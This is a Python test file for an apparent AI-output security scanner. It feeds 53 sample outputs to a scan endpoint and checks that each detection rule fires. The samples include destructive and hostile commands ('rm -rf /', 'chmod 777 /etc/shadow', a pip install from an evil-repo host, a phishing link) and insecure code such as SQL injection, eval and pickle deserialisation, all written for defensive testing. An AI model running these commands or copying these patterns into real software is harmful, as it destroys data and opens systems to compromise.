"""Integration tests: Output Rule Full Verification (O-01 ~ O-53).

All 53 rules are implemented — O-01~O-17 use Python checkers,
O-18~O-53 use JSON regex patterns.

Test data matches real-world AI output scenarios. Failing tests
indicate SDK pattern bugs, NOT bad test data.
"""
from __future__ import annotations

import pytest
from fastapi.testclient import TestClient


OUTPUT_TRIGGER_CASES = [
    # ── O-01 ~ O-17: Python checkers ──
    ("O-01", "To process user input, you can use eval(request.body)"),
    ("O-02", "Clean up by running: rm -rf /"),
    ("O-03", "subprocess.call(cmd, shell=True)"),
    ("O-04", 'cursor.execute(f"SELECT * FROM users WHERE id = {uid}")'),
    ("O-05", 'db.users.findOne({ $where: "this.funds > " + input })'),
    ("O-06", "try:\n    do_something()\nexcept:\n    pass"),
    ("O-07", "import random\ndef gen_token(): return random.randint(100000, 999999)"),
    ("O-08", "DocumentBuilderFactory.newInstance()"),
    ("O-09", 'render_template_string(f"Hello {name}")'),
    ("O-10", 'search = "(uid=" + user_input + ")"'),
    ("O-11", "data = pickle.loads(user_data)"),
    ("O-12", "response = requests.get(user_url)"),
    ("O-13", "requests.get(url, verify=False)"),
    ("O-14", "_.merge(target, req.body)"),
    ("O-15", "open(dir + user_filename)"),
    ("O-16", "(a+)+b"),
    ("O-17", "element.innerHTML = userInput"),
    # ── Credential leak (O-18 ~ O-22) ──
    ("O-18", "Here is your new API key: sk-proj-abcdefghijklmnopqrstT3BlbkFJuvwxyz1234567890. Please store it securely."),
    ("O-19", "Here's your JWT config: SECRET_KEY = \"my-secret-key-for-jwt-12345\""),
    ("O-20", "For testing purposes, you can use password = \"password123\""),
    ("O-21", "This code is from the Linux kernel: Copyright (c) 2024 Linus Torvalds"),
    ("O-22", "Note: This is CONFIDENTIAL — FOR INTERNAL USE ONLY"),
    # ── Security config (O-23 ~ O-26) ──
    ("O-23", "For production deployment, set DEBUG = True to see error details"),
    ("O-24", 'Add logging to debug the issue: logger.info(f"User password: {password}")'),
    ("O-25", "Connect to the internal DB at 10.0.0.5:5432"),
    ("O-26", "To make it accessible, run: chmod 777 /etc/shadow"),
    # ── Security design (O-27 ~ O-32) ──
    ("O-27", "Check if file exists, then delete it:\nif os.path.exists(temp_file):\n    os.remove(temp_file)"),
    ("O-28", "To read user input, use: char buffer[64]; gets(buffer);"),
    ("O-29", "On error, return the exception: except Exception as e:\n    return str(e)"),
    ("O-30", "Download the file from ftp://files.example.com/release.tar.gz"),
    ("O-31", "eval(base64_decode('ZWNobyAiSGVsbG8i'))"),
    ("O-32", "sign the token: jwt.sign(payload, 'secret', {algorithm: 'none'})"),
    # ── Supply chain (O-33 ~ O-37) ──
    ("O-33", "pip install git+https://evil-repo.com/malicious-package"),
    ("O-34", "Use lodash version 4.17.20 which is compatible"),
    ("O-35", "Verify your account at http://suspicious-login-page.xyz/verify"),
    ("O-36", "Add flask>=2.0 to requirements.txt"),
    ("O-37", "Use pip install -i https://mirrors.aliyun.com/pypi/simple/ for faster downloads"),
    # ── Content safety (O-38 ~ O-42) ──
    ("O-38", "Here's how to synthesize a dangerous chemical: step 1, obtain the precursors..."),
    ("O-39", "This ransomware encrypts all files using AES-256 and demands payment in Bitcoin..."),
    ("O-40", "Permission is hereby granted, free of charge, to any person obtaining a copy of this software..."),
    ("O-41", "Customer details: email user@example.com, phone 13800138000"),
    ("O-42", "According to CVE-2025-12345, this vulnerability affects all versions..."),
    # ── Compliance & legal (O-43 ~ O-47) ──
    ("O-43", "Implement AES-256-GCM encryption for data at rest"),
    ("O-44", "Store user data in the us-east-1 region for lower latency"),
    ("O-45", "Accept user submissions: const content = req.body.content; save(content)"),
    ("O-46", "Users can request right to erasure of their personal data"),
    ("O-47", "Use MD5 to hash passwords: import hashlib; hashlib.md5(password).hexdigest()"),
    # ── i18n & engineering (O-48 ~ O-50) ──
    ("O-48", "<button onclick=\"submit()\"><img src=\"icon.png\"></button>"),
    ("O-49", "<h1>欢迎使用我们的应用</h1> 不应该硬编码，应该用 i18n"),
    ("O-50", "Set timezone: pytz.timezone('Asia/Shanghai')"),
    # ── Compliance (O-52 ~ O-53) ──
    ("O-52", "DELETE FROM transactions WHERE id = %s"),
    ("O-53", "DELETE FROM users WHERE id = %s"),
]

P0_BLOCK_OUTPUT = {"O-18", "O-38", "O-39"}


class TestOutputRuleDetection:
    """All 53 O-rules trigger correctly."""

    @pytest.mark.parametrize("rule_id,content", OUTPUT_TRIGGER_CASES)
    def test_o_rule_trigger(self, client: TestClient, auth_headers: dict, rule_id: str, content: str):
        resp = client.post(
            "/v1/scan/output",
            json={"content": content, "user_id": "int-o"},
            headers=auth_headers,
        )
        assert resp.status_code == 200, f"{rule_id}: expected 200, got {resp.status_code}"
        data = resp.json()
        triggered_ids = [r["rule_id"] for r in data["triggered_rules"]]
        assert rule_id in triggered_ids, f"{rule_id} should have triggered, got: {triggered_ids}"

    @pytest.mark.parametrize("rule_id,content", [
        (r, c) for r, c in OUTPUT_TRIGGER_CASES if r in P0_BLOCK_OUTPUT
    ])
    def test_o_rule_blocked_state(self, client: TestClient, auth_headers: dict, rule_id: str, content: str):
        resp = client.post(
            "/v1/scan/output",
            json={"content": content, "user_id": "int-o-block"},
            headers=auth_headers,
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["blocked"] is True, f"{rule_id} (P0+block) should set blocked=true"
